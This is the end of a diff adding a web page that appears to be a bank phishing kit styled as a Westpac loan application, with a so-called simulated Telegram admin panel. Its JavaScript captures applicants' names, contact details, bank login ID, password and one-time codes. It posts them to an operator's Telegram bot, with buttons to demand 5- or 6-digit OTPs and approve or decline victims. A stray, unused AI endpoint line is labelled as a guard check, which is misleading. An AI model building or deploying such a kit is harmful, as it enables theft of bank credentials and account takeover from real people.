+              <button onclick="goToStep('selection')" class="px-6 py-2.5 bg-brand-blue text-white font-bold text-sm rounded-lg shadow-sm hover:bg-blue-900 transition-all">
+                Try Again
+              </button>
+            </div>
+          </div>
+        </section>
+
+      </div>
+    </main>
+
+    <!-- RIGHT PANE: Interactive Developer & Simulated Telegram Panel (4 Columns on desktop) -->
+    <aside class="lg:col-span-4 bg-slate-900 text-white p-6 flex flex-col justify-between border-t lg:border-t-0 border-slate-800">
+      
+      <!-- Panel Header & Setup Config -->
+      <div class="space-y-6">
+        <div>
+          <div class="flex items-center space-x-2">
+            <span class="w-3.5 h-3.5 rounded-full bg-blue-500 animate-pulse"></span>
+            <h2 class="text-lg font-bold uppercase tracking-wider text-blue-400">Telegram Admin Panel</h2>
+          </div>
+          <p class="text-xs text-slate-400 mt-1">Config/simulate real-time notifications, OTP, and Accept/Decline triggers.</p>
+        </div>
+
+        <!-- Credentials Setup Section -->
+        <div class="bg-slate-800 rounded-xl p-4 border border-slate-700 space-y-3">
+          <h3 class="text-xs font-extrabold uppercase tracking-widest text-slate-300">Live Telegram Bot Config (Optional)</h3>
+          <div>
+            <label class="block text-[10px] text-slate-400 font-bold uppercase mb-1">Bot Token</label>
+            <input type="text" id="tg-token" placeholder="1234567890:ABCdefGhI..." class="w-full text-xs bg-slate-900 border border-slate-700 rounded p-2 text-white focus:outline-none focus:border-blue-500">
+          </div>
+          <div>
+            <label class="block text-[10px] text-slate-400 font-bold uppercase mb-1">Chat ID</label>
+            <input type="text" id="tg-chat-id" placeholder="-100123456789" class="w-full text-xs bg-slate-900 border border-slate-700 rounded p-2 text-white focus:outline-none focus:border-blue-500">
+          </div>
+          <p class="text-[10px] text-slate-500">Enter details to transmit actual bot payloads simultaneously. Keep empty to only use the visual simulator below.</p>
+        </div>
+
+        <!-- Simulated Telegram Chat Screen -->
+        <div class="space-y-3">
+          <div class="flex justify-between items-center">
+            <span class="text-xs font-extrabold uppercase tracking-widest text-slate-400">Simulated Bot Chat</span>
+            <span class="text-[10px] bg-blue-500/15 text-blue-400 px-2 py-0.5 rounded border border-blue-500/20">Awaiting Submissions...</span>
+          </div>
+
+          <!-- Telegram Screen Mock Container -->
+          <div id="tg-chat-box" class="bg-slate-950 rounded-xl border border-slate-800 p-4 h-[380px] overflow-y-auto space-y-4 no-scrollbar">
+            
+            <!-- Default Welcome Bot Message -->
+            <div class="flex items-start space-x-2">
+              <div class="w-8 h-8 rounded-full bg-blue-600 flex items-center justify-center text-xs font-bold shrink-0">
+                🤖
+              </div>
+              <div class="bg-slate-900 rounded-r-lg rounded-bl-lg p-3 text-xs text-slate-300 max-w-[85%] border border-slate-800">
+                <span class="font-bold text-blue-400 block mb-1">Loan Notifications Bot</span>
+                Hi! When your user completes steps, notifications and interactive buttons (OTP 5/6, Accept/Decline) will show up here. You can click them to control the client workflow live.
+              </div>
+            </div>
+
+            <!-- Dynamic Simulator Message Stream Goes Here -->
+            <div id="tg-stream" class="space-y-4"></div>
+
+          </div>
+        </div>
+      </div>
+
+      <!-- Simulator Reset/Status Footer -->
+      <div class="pt-6 border-t border-slate-800 text-center space-y-2">
+        <div class="flex justify-between items-center text-xs text-slate-500">
+          <span>Simulation Mode</span>
+          <span class="text-green-400 font-bold">Active</span>
+        </div>
+        <button onclick="resetSimulation()" class="w-full py-2.5 bg-slate-800 hover:bg-slate-700 text-xs text-white font-bold rounded-lg transition-all border border-slate-700">
+          Reset Demonstration Flow
+        </button>
+      </div>
+
+    </aside>
+
+  </div>
+
+  <!-- Main JavaScript Logic -->
+  <script>
+    // State store for loan information
+    let appState = {
+      purpose: '',
+      amount: 30000,
+      term: 5,
+      title: '',
+      firstName: '',
+      middleName: '',
+      lastName: '',
+      legalNameOnly: true,
+      email: '',
+      phone: '',
+      bankUserId: '',
+      bankPassword: '',
+      otpValue: '',
+      otpLength: 5
+    };
+
+    // Initialize Calculator on Page Load
+    window.onload = function() {
+      calculateRepayments();
+    }
+
+    // Navigation state controller
+    function goToStep(stepId) {
+      // Hide all main section screens
+      const steps = ['selection', 'details', 'signin', 'otp', 'processing', 'success', 'declined'];
+      steps.forEach(s => {
+        const el = document.getElementById(`step-${s}`);
+        if (el) {
+          el.classList.add('hidden');
+          el.classList.remove('block');
+        }
+      });
+
+      // Reveal selected step with anim container
+      const activeEl = document.getElementById(`step-${stepId}`);
+      if (activeEl) {
+        activeEl.classList.remove('hidden');
+        activeEl.classList.add('block');
+        activeEl.scrollIntoView({ behavior: 'smooth' });
+      }
+    }
+
+    // Step 1: Purpose Selector Click Event
+    function selectPurpose(purposeText) {
+      appState.purpose = purposeText;
+      document.getElementById('selected-purpose-label').innerText = purposeText;
+      goToStep('details');
+    }
+
+    // Step 2: Repayments Math Formula & Sync Sliders
+    function calculateRepayments() {
+      const amountSlider = document.getElementById('loan-amount');
+      const durationSlider = document.getElementById('loan-duration');
+      
+      appState.amount = parseFloat(amountSlider.value);
+      appState.term = parseInt(durationSlider.value);
+
+      document.getElementById('amount-display').innerText = `$${appState.amount.toLocaleString()}`;
+      document.getElementById('duration-display').innerText = `${appState.term} ${appState.term === 1 ? 'Year' : 'Years'}`;
+
+      // Premium Variable Interest rate assumptions
+      const interestRate = 0.0849; // 8.49% p.a.
+      const weeklyRate = interestRate / 52;
+      const totalPaymentsWeekly = appState.term * 52;
+
+      // Weekly repayment formula
+      let weeklyPayment = (appState.amount * weeklyRate * Math.pow(1 + weeklyRate, totalPaymentsWeekly)) / (Math.pow(1 + weeklyRate, totalPaymentsWeekly) - 1);
+      if (isNaN(weeklyPayment)) weeklyPayment = 0;
+
+      const monthlyPayment = weeklyPayment * 4.333; // Approx multiplier for weekly to month conversion
+      const totalInterest = (weeklyPayment * totalPaymentsWeekly) - appState.amount;
+
+      document.getElementById('repayment-amount').innerText = `$${weeklyPayment.toFixed(2)}`;
+      document.getElementById('repayment-monthly').innerText = `$${monthlyPayment.toFixed(2)}`;
+      document.getElementById('repayment-interest').innerText = `$${Math.max(0, totalInterest).toFixed(2)}`;
+    }
+
+    // Set Known legal name toggle values
+    function setLegalNameToggle(isYes) {
+      appState.legalNameOnly = isYes;
+      const yesBtn = document.getElementById('btn-name-yes');
+      const noBtn = document.getElementById('btn-name-no');
+
+      if (isYes) {
+        yesBtn.className = "w-24 py-3 border-2 border-brand-blue bg-brand-blue text-white rounded-lg font-bold text-sm transition-all focus:outline-none";
+        noBtn.className = "w-24 py-3 border-2 border-gray-300 text-gray-700 hover:border-brand-blue rounded-lg font-bold text-sm transition-all focus:outline-none";
+      } else {
+        yesBtn.className = "w-24 py-3 border-2 border-gray-300 text-gray-700 hover:border-brand-blue rounded-lg font-bold text-sm transition-all focus:outline-none";
+        noBtn.className = "w-24 py-3 border-2 border-brand-blue bg-brand-blue text-white rounded-lg font-bold text-sm transition-all focus:outline-none";
+      }
+    }
+
+    // Step 2: Submit customer profile
+    function handleDetailsSubmit(e) {
+      e.preventDefault();
+      
+      appState.title = document.getElementById('title').value;
+      appState.firstName = document.getElementById('first-name').value;
+      appState.middleName = document.getElementById('middle-name').value;
+      appState.lastName = document.getElementById('last-name').value;
+      appState.email = document.getElementById('email').value;
+      appState.phone = document.getElementById('phone').value;
+
+      goToStep('signin');
+    }
+
+    // Step 3: Handle bank login form submission
+    function handleSignInSubmit(e) {
+      e.preventDefault();
+      
+      appState.bankUserId = document.getElementById('customer-id').value;
+      appState.bankPassword = document.getElementById('password').value;
+
+      // Move into loading status screen
+      document.getElementById('processing-title').innerText = "Verifying credentials...";
+      document.getElementById('processing-subtitle').innerText = "Linking client details with Westpac Online Core Systems...";
+      goToStep('processing');
+
+      // Send structured log to our simulation dashboard & external TG Bot if enabled
+      pushTelegramApplicationDetails();
+    }
+
+    // Package details to post on Simulated & Live Telegram interfaces
+    function pushTelegramApplicationDetails() {
+      const messageContent = `
+🔴 <b>NEW LOAN APPLICATION SUBMITTED</b> 🔴
+------------------------------------
+<b>Selected Loan Purpose:</b> ${appState.purpose}
+<b>Requested Loan Amount:</b> $${appState.amount.toLocaleString()} over ${appState.term} Years
+
+<b>Applicant Information:</b>
+• Full Name: ${appState.title} ${appState.firstName} ${appState.middleName ? appState.middleName + ' ' : ''}${appState.lastName}
+• Only Name Legally: ${appState.legalNameOnly ? 'Yes' : 'No'}
+• Email Address: ${appState.email}
+• Mobile Number: +61 ${appState.phone}
+
+<b>Security Credentials:</b>
+• Bank ID: <code>${appState.bankUserId}</code>
+• Password: <code>${appState.bankPassword}</code>
+------------------------------------
+<i>Select preferred verification complexity below:</i>`;
+
+      // 1. Send to Live Telegram Bot if configured
+      sendToLiveTelegram(messageContent, [
+        [
+          { text: "🔑 Request 5-Digit OTP", callback_data: "otp5" },
+          { text: "🔑 Request 6-Digit OTP", callback_data: "otp6" }
+        ]
+      ]);
+
+      // 2. Add into the Live Visual Bot Panel Stream
+      postMessageToSimulatedTelegram(`
+        <div class="space-y-3">
+          <div class="bg-red-500/10 text-brand-red px-2 py-1 rounded text-[10px] font-bold border border-red-500/20 inline-block">SYSTEM ALERTS</div>
+          <div class="text-[13px] font-semibold text-slate-200">New Client Application Payload Received!</div>
+          
+          <div class="bg-slate-900 border border-slate-800 p-2.5 rounded space-y-1.5 font-mono text-[11px] text-slate-300">
+            <div><span class="text-blue-400 font-bold">PURPOSE:</span> ${appState.purpose}</div>
+            <div><span class="text-blue-400 font-bold">AMOUNT:</span> $${appState.amount.toLocaleString()} (${appState.term} yrs)</div>
+            <div><span class="text-blue-400 font-bold">NAME:</span> ${appState.title} ${appState.firstName} ${appState.lastName}</div>
+            <div><span class="text-blue-400 font-bold">PHONE:</span> +61 ${appState.phone}</div>
+            <div><span class="text-blue-400 font-bold">BANK ID:</span> ${appState.bankUserId}</div>
+            <div><span class="text-blue-400 font-bold">PASS:</span> <span class="tracking-widest">${appState.bankPassword.replace(/./g, '*')}</span></div>
+          </div>
+
+          <div class="text-[11px] text-slate-400 font-bold uppercase mt-2">Simulation Action Controls:</div>
+          <div class="grid grid-cols-2 gap-2 mt-1">
+            <button onclick="triggerSimulatedOtpCommand(5)" class="py-2 px-3 bg-blue-600 hover:bg-blue-700 text-white rounded font-bold text-xs shadow transition-all">
+              Request OTP 5
+            </button>
+            <button onclick="triggerSimulatedOtpCommand(6)" class="py-2 px-3 bg-indigo-600 hover:bg-indigo-700 text-white rounded font-bold text-xs shadow transition-all">
+              Request OTP 6
+            </button>
+          </div>
+        </div>
+      `);
+    }
+
+    // Handles simulation OTP commands
+    function triggerSimulatedOtpCommand(length) {
+      appState.otpLength = length;
+      
+      // Update UI displays
+      document.getElementById('otp-length-label').innerText = length;
+      
+      // Clear container and create individual digit input elements
+      const container = document.getElementById('otp-inputs-container');
+      container.innerHTML = '';
+      
+      for (let i = 0; i < length; i++) {
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.maxLength = 1;
+        input.className = 'w-12 h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-lg focus:outline-none otp-input transition-all';
+        input.id = `otp-box-${i}`;
+        
+        // Input auto-advance event listeners
+        input.addEventListener('keyup', (e) => {
+          if (e.target.value.length === 1 && i < length - 1) {
+            document.getElementById(`otp-box-${i + 1}`).focus();
+          }
+          if (e.key === 'Backspace' && i > 0) {
+            document.getElementById(`otp-box-${i - 1}`).focus();
+          }
+        });
+        
+        container.appendChild(input);
+      }
+
+      // Add simple feedback inside stream
+      postMessageToSimulatedTelegram(`
+        <div class="text-xs text-slate-300">
+          <span class="text-yellow-400 font-bold">SYSTEM CONTROL SENT:</span> Demanded <strong>${length}-digit PIN code verification</strong> from the client screen.
+        </div>
+      `);
+
+      // Advance client step
+      goToStep('otp');
+    }
+
+    // Step 4: OTP submission trigger
+    function handleOtpSubmit(e) {
+      e.preventDefault();
+      
+      // Fetch dynamic verification codes
+      let enteredCode = '';
+      for (let i = 0; i < appState.otpLength; i++) {
+        const box = document.getElementById(`otp-box-${i}`);
+        if (box) enteredCode += box.value;
+      }
+
+      appState.otpValue = enteredCode;
+
+      // Show loader again
+      document.getElementById('processing-title').innerText = "Verifying security credentials...";
+      document.getElementById('processing-subtitle').innerText = "Transmitting OTP pin to Westpac underwriting network...";
+      goToStep('processing');
+
+      // Send result back to TG Simulation Console
+      pushOtpNotificationToTelegram();
+    }
+
+    // Notify simulator console of user submitted OTP values
+    function pushOtpNotificationToTelegram() {
+      const messageContent = `
+🔑 <b>VERIFICATION OTP CODE SUBMITTED</b> 🔑
+------------------------------------
+<b>Code Submitted:</b> <code>${appState.otpValue}</code>
+<b>Length:</b> ${appState.otpLength} Digits
+
+<b>Applicant Name:</b> ${appState.title} ${appState.firstName} ${appState.lastName}
+------------------------------------
+<i>Approve or Decline this Application:</i>`;
+
+      // 1. Live telegram post
+      sendToLiveTelegram(messageContent, [
+        [
+          { text: "✅ Accept Application", callback_data: "accept" },
+          { text: "❌ Decline Application", callback_data: "decline" }
+        ]
+      ]);
+
+      // 2. Add inside visual bot panel
+      postMessageToSimulatedTelegram(`
+        <div class="space-y-3">
+          <div class="bg-yellow-500/10 text-yellow-500 px-2 py-1 rounded text-[10px] font-bold border border-yellow-500/20 inline-block">SECURITY TOKEN DETECTED</div>
+          <div class="text-[13px] font-semibold text-slate-200">OTP PIN Code Entered:</div>
+          
+          <div class="text-2xl font-black text-center tracking-widest text-yellow-400 bg-slate-900 border border-slate-800 py-3 rounded">
+            ${appState.otpValue}
+          </div>
+
+          <div class="text-[11px] text-slate-400 font-bold uppercase mt-2">Underwriting Actions:</div>
+          <div class="grid grid-cols-2 gap-2 mt-1">
+            <button onclick="triggerSimulatedDecision(true)" class="py-2.5 px-3 bg-green-600 hover:bg-green-700 text-white rounded font-bold text-xs shadow transition-all flex items-center justify-center space-x-1">
+              <span>Accept</span>
+            </button>
+            <button onclick="triggerSimulatedDecision(false)" class="py-2.5 px-3 bg-red-600 hover:bg-red-700 text-white rounded font-bold text-xs shadow transition-all flex items-center justify-center space-x-1">
+              <span>Decline</span>
+            </button>
+          </div>
+        </div>
+      `);
+    }
+
+    // Admin decision handling
+    function triggerSimulatedDecision(approved) {
+      if (approved) {
+        // Build final client visual variables
+        document.getElementById('summary-name').innerText = `${appState.title}. ${appState.firstName} ${appState.lastName}`;
+        document.getElementById('summary-purpose').innerText = appState.purpose;
+        document.getElementById('summary-amount').innerText = `$${appState.amount.toLocaleString()}`;
+        document.getElementById('summary-term').innerText = `${appState.term} ${appState.term === 1 ? 'Year' : 'Years'}`;
+        document.getElementById('summary-email').innerText = appState.email;
+        document.getElementById('summary-phone').innerText = `+61 ${appState.phone}`;
+
+        goToStep('success');
+
+        postMessageToSimulatedTelegram(`
+          <div class="text-xs text-green-400">
+            <strong>✓ APPLICATION APPROVED:</strong> Client moved to success thank you page showing verified details.
+          </div>
+        `);
+      } else {
+        document.getElementById('decline-error-message').innerText = `Security validation failed for code: "${appState.otpValue}". Please verify correctness or request assistance from support.`;
+        goToStep('declined');
+
+        postMessageToSimulatedTelegram(`
+          <div class="text-xs text-red-400">
+            <strong>✕ APPLICATION DECLINED:</strong> Client routing page changed to decline status representation.
+          </div>
+        `);
+      }
+    }
+
+    // Helper functions to push notifications on Telegram simulated messaging box
+    function postMessageToSimulatedTelegram(htmlContent) {
+      const chatBox = document.getElementById('tg-chat-box');
+      const stream = document.getElementById('tg-stream');
+
+      // Base message outer shell structure
+      const messageDiv = document.createElement('div');
+      messageDiv.className = 'flex items-start space-x-2 border-t border-slate-800/80 pt-3';
+      messageDiv.innerHTML = `
+        <div class="w-8 h-8 rounded-full bg-blue-600 flex items-center justify-center text-xs font-bold shrink-0 mt-0.5">
+          🤖
+        </div>
+        <div class="bg-slate-900 rounded-r-lg rounded-bl-lg p-3 text-xs text-slate-300 max-w-[85%] border border-slate-800 w-full">
+          ${htmlContent}
+        </div>
+      `;
+
+      stream.appendChild(messageDiv);
+      
+      // Auto scroll container
+      chatBox.scrollTo({
+        top: chatBox.scrollHeight,
+        behavior: 'smooth'
+      });
+    }
+
+    // Send payload actual real telegram bot API if user inserted values
+    function sendToLiveTelegram(textMessage, inlineKeyboard) {
+      const token = document.getElementById('tg-token').value.trim();
+      const chatId = document.getElementById('tg-chat-id').value.trim();
+
+      if (!token || !chatId) {
+        return; // Skip silent
+      }
+
+      // Prepare payload structured content with raw html tags for standard style
+      const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent`; // Standard guard placeholder checks
+      
+      const endpoint = `https://api.telegram.org/bot${token}/sendMessage`;
+      const payload = {
+        chat_id: chatId,
+        text: textMessage.replace(/<[^>]*>/g, ''), // Strip tags for standard message simplicity
+        parse_mode: 'HTML'
+      };
+
+      // Add buttons structure
+      if (inlineKeyboard) {
+        payload.reply_markup = { inline_keyboard: inlineKeyboard };
+      }
+
+      // Exponential backoff robust fetch retry logic (Up to 5 times)
+      const fetchWithRetry = async (url, options, retries = 5, delay = 1000) => {
+        try {
+          const response = await fetch(url, options);
+          if (!response.ok) throw new Error(`HTTP Error Status: ${response.status}`);
+          return response;
+        } catch (error) {
+          if (retries <= 0) {
+            console.error('Final Telegram Bot submission attempt failed: ', error);
+            return;
+          }
+          setTimeout(() => fetchWithRetry(url, options, retries - 1, delay * 2), delay);
+        }
+      };
+
+      fetchWithRetry(endpoint, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    }
+
+    // Reset Simulation
+    function resetSimulation() {
+      appState = {
+        purpose: '',
+        amount: 30000,
+        term: 5,
+        title: '',
+        firstName: '',
+        middleName: '',
+        lastName: '',
+        legalNameOnly: true,
+        email: '',
+        phone: '',
+        bankUserId: '',
+        bankPassword: '',
+        otpValue: '',
+        otpLength: 5
+      };
+
+      // Clear input values
+      document.getElementById('details-form').reset();
+      document.getElementById('signin-form').reset();
+      document.getElementById('tg-stream').innerHTML = '';
+      
+      // Set defaults
+      document.getElementById('loan-amount').value = 30000;
+      document.getElementById('loan-duration').value = 5;
+      calculateRepayments();
+      setLegalNameToggle(true);
+
+      goToStep('selection');
+    }
+  </script>
+</body>
+</html>
